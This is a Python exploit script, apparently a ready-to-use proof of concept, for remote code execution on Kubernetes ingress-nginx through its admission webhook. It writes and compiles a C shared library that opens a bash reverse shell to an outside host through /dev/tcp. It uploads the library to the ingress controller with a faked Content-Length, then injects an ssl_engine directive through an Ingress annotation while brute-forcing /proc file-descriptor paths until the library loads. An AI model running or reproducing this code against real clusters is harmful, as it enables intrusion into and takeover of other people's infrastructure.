import argparse
import json
import os
import socket
import sys
import copy
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class K8sAdmissionExploit:
    """
    Kubernetes Admission Controller Exploit

    This class implements an exploit for Kubernetes admission controllers
    by uploading a malicious shared library through an ingress controller
    and then triggering its execution via admission webhook.
    """

    # Template for the malicious shared library
    SHELL_TEMPLATE = """
    #include <stdlib.h>

    __attribute__((constructor))
    void run_on_load() {
        system("bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'");
    }

    int bind(void *e, const char *id) {
        return 1;
    }

    void ENGINE_load_evil() {}

    int bind_engine() {
        return 1;
    }
    """

    ADMISSION_REVIEW = {
        "kind": "AdmissionReview",
        "apiVersion": "admission.k8s.io/v1",
        "request": {
            "uid": "e166d137-ff47-443f-9108-9eb42e9738e8",
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses",
            },
            "requestKind": {
                "group": "networking.k8s.io",
                "version": "v1",
                "kind": "Ingress",
            },
            "requestResource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses",
            },
            "name": "eumesmo",
            "namespace": "default",
            "operation": "CREATE",
            "userInfo": {
                "username": "kube-review",
                "uid": "0e484028-0d13-4d6a-9267-92e4a5e2c801",
            },
            "object": {
                "kind": "Ingress",
                "apiVersion": "networking.k8s.io/v1",
                "metadata": {
                    "name": "eumesmo",
                    "namespace": "default",
                    "creationTimestamp": None,
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../REPLACE;\n#",
                        "nginx.ingress.kubernetes.io/auth-tls-secret": "calico-system/node-certs",
                        "nginx.ingress.kubernetes.io/backend-protocol": "FCGI",
                    },
                },
                "spec": {
                    "rules": [
                        {
                            "host": "zwx.lab",
                            "http": {
                                "paths": [
                                    {
                                        "path": "/",
                                        "pathType": "Prefix",
                                        "backend": {
                                            "service": {
                                                "name": "nginx",
                                                "port": {"number": 80},
                                            }
                                        },
                                    }
                                ]
                            },
                        }
                    ]
                },
                "status": {"loadBalancer": {}},
            },
            "oldObject": None,
            "dryRun": True,
            "options": {"kind": "CreateOptions", "apiVersion": "meta.k8s.io/v1"},
        },
    }

    def __init__(
        self,
        ingress_url,
        admission_url,
        reverse_host,
        reverse_port,
        max_proc=50,
        max_fd=30,
        max_workers=10,
        debug=False,
        timeout=5,
    ):
        """
        Initialize the exploit with target information.

        Args:
            ingress_url: URL of the ingress controller
            admission_url: URL of the admission webhook
            reverse_host: Host for the reverse shell
            reverse_port: Port for the reverse shell
            max_proc: Maximum process ID to try
            max_fd: Maximum file descriptor to try
            max_workers: Maximum number of concurrent workers
            debug: Whether to enable debug output
            timeout: Request timeout in seconds
        """
        self.ingress_url = ingress_url
        self.admission_url = admission_url
        self.reverse_host = reverse_host
        self.reverse_port = reverse_port
        self.max_proc = max_proc
        self.max_fd = max_fd
        self.max_workers = max_workers
        self.debug = debug
        self.timeout = timeout
        self.so_file = "evil_engine.so"
        self.socket = None

    def log(self, message, level="info"):
        """
        Log a message with the specified level.

        Args:
            message: The message to log
            level: The log level (info, success, error, warning)
        """
        prefix = {
            "info": "[*]",
            "success": "[+]",
            "error": "[-]",
            "warning": "[!]",
        }.get(level, "[*]")

        print(f"{prefix} {message}")

    def create_malicious_library(self):
        """
        Create the malicious shared library that will be used for the exploit.

        Returns:
            bool: True if compilation was successful, False otherwise
        """
        self.log(
            f"Creating malicious library targeting {self.reverse_host}:{self.reverse_port}"
        )

        lib_code = self.SHELL_TEMPLATE.replace("HOST", self.reverse_host).replace(
            "PORT", str(self.reverse_port)
        )

        c_file = "evil_engine.c"
        with open(c_file, "w") as f:
            f.write(lib_code)

        compile_cmd = f"gcc -fPIC -Wall -shared -o {self.so_file} {c_file} -lcrypto"
        self.log(f"Compiling with command: {compile_cmd}")

        process = os.system(compile_cmd)
        if process == 0:
            self.log(
                f"Shared object compiled successfully to {self.so_file}", "success"
            )
            return True
        else:
            self.log("Error compiling shared object - is gcc installed?", "error")
            return False

    def send_admission_request(self, path):
        """
        Send a request to the admission webhook with a specific path.

        Args:
            path: The path to use in the request

        Returns:
            tuple: (success, response_code)
        """
        json_data = self.ADMISSION_REVIEW
        replaced_data = copy.deepcopy(json_data)
        annotation = replaced_data["request"]["object"]["metadata"]["annotations"][
            "nginx.ingress.kubernetes.io/auth-tls-match-cn"
        ]
        replaced_data["request"]["object"]["metadata"]["annotations"][
            "nginx.ingress.kubernetes.io/auth-tls-match-cn"
        ] = annotation.replace("REPLACE", path)

        headers = {"Content-Type": "application/json"}

        full_url = self.admission_url.rstrip("/") + "/admission"

        # Use json parameter to properly serialize the Python dict
        response = requests.post(
            full_url,
            json=replaced_data,  # Change data to json
            headers=headers,
            verify=False,
            timeout=self.timeout,
        )

        # Print raw response first
        print(f"Response status: {response.status_code}")
        print(f"Response body: {response.text}")

        # Safely try to parse JSON if present
        try:
            if response.text.strip():
                print(f"JSON response: {response.json()}")
        except Exception as e:
            print(f"Error parsing JSON: {e}")

        if self.debug:
            self.log(f"Response for {path}: {response.status_code}")

        return True, response.status_code

    def brute_force_admission(self):
        """
        Brute force the admission webhook by trying different proc/fd paths.
        """
        self.log(
            f"Starting admission webhook brute force with {self.max_workers} workers"
        )
        self.log(
            f"Testing proc IDs 1-{self.max_proc} and file descriptors 3-{self.max_fd}"
        )

        found = False
        results = []

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []

            for proc in range(1, self.max_proc + 1):
                for fd in range(3, self.max_fd + 1):
                    path = f"proc/{proc}/fd/{fd}"
                    if self.debug:
                        self.log(f"Testing {path}")
                    futures.append(
                        (executor.submit(self.send_admission_request, path), path)
                    )

            for future, path in futures:
                success, status_code = future.result()
                if success and status_code is not None:
                    results.append((path, status_code))
                    if status_code != 200:
                        self.log(f"Response for {path}: {status_code}", "warning")
                    else:
                        self.log(f"Response for {path}: {status_code}", "success")
                        found = True

        if not found:
            self.log(
                "No successful paths found. Consider increasing max_proc or max_fd.",
                "warning",
            )
        else:
            self.log("Brute force completed successfully.", "success")

    def exploit_ingress(self):
        """
        Send the malicious library to the ingress controller.

        Returns:
            bool: True if the exploit was sent successfully
        """
        self.log(
            f"Sending malicious library to ingress controller at {self.ingress_url}"
        )

        with open(self.so_file, "rb") as f:
            evil_engine = f.read()

        parsed = urlparse(self.ingress_url)
        host = parsed.hostname
        port = parsed.port or 80
        path = parsed.path or "/"

        self.socket = socket.create_connection((host, port), timeout=10)

        real_length = len(evil_engine)
        fake_length = real_length + 10

        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: kubernetes-exploit\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {fake_length}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode("iso-8859-1")

        http_payload = headers + evil_engine

        self.socket.sendall(http_payload)
        self.log("Malicious library sent to ingress controller", "success")

        if self.debug:
            response = b""
            self.socket.settimeout(2)
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    break
                response += chunk

            self.log("Response from ingress:")
            print(response.decode(errors="ignore"))

        return True

    def cleanup(self):
        """Clean up resources"""
        if self.socket:
            self.socket.close()
            self.socket = None

    def run(self):
        """
        Run the complete exploit

        Returns:
            int: Exit code (0 for success, 1 for failure)
        """
        if not self.create_malicious_library():
            return 1

        if not self.exploit_ingress():
            return 1

        self.log("Waiting for a moment before starting brute force...")
        time.sleep(1)

        self.brute_force_admission()

        self.cleanup()

        self.log("Exploit completed")
        return 0


class ExploitCLI:
    """Command-line interface for the exploit"""

    @staticmethod
    def parse_args():
        """Parse command-line arguments"""
        parser = argparse.ArgumentParser(
            description="Kubernetes Admission Controller Exploit"
        )
        parser.add_argument("ingress_url", help="URL of the ingress controller")
        parser.add_argument("admission_url", help="URL of the admission webhook")
        parser.add_argument(
            "reverse_shell", help="Reverse shell host:port (e.g., 10.0.0.1:4444)"
        )
        parser.add_argument(
            "--max-proc", type=int, default=50, help="Maximum process ID to try"
        )
        parser.add_argument(
            "--max-fd", type=int, default=30, help="Maximum file descriptor to try"
        )
        parser.add_argument(
            "--workers", type=int, default=10, help="Number of concurrent workers"
        )
        parser.add_argument("--debug", action="store_true", help="Enable debug output")
        parser.add_argument(
            "--timeout", type=int, default=5, help="Request timeout in seconds"
        )

        return parser.parse_args()

    @staticmethod
    def main():
        """Main entry point"""
        args = ExploitCLI.parse_args()

        if ":" not in args.reverse_shell:
            print("[-] Invalid reverse shell format. Use host:port")
            return 1

        host, port = args.reverse_shell.split(":")

        exploit = K8sAdmissionExploit(
            args.ingress_url,
            args.admission_url,
            host,
            port,
            max_proc=args.max_proc,
            max_fd=args.max_fd,
            max_workers=args.workers,
            debug=args.debug,
            timeout=args.timeout,
        )

        print(f"[!] Make sure you have a listener running on {host}:{port}")
        print(f"[!] Example: nc -lvnp {port}")

        if not args.debug:  # Skip confirmation in debug mode
            confirm = input("Continue with the exploit? [y/N]: ")
            if confirm.lower() != "y":
                print("[*] Exploit aborted")
                return 0

        return exploit.run()


if __name__ == "__main__":
    sys.exit(ExploitCLI.main())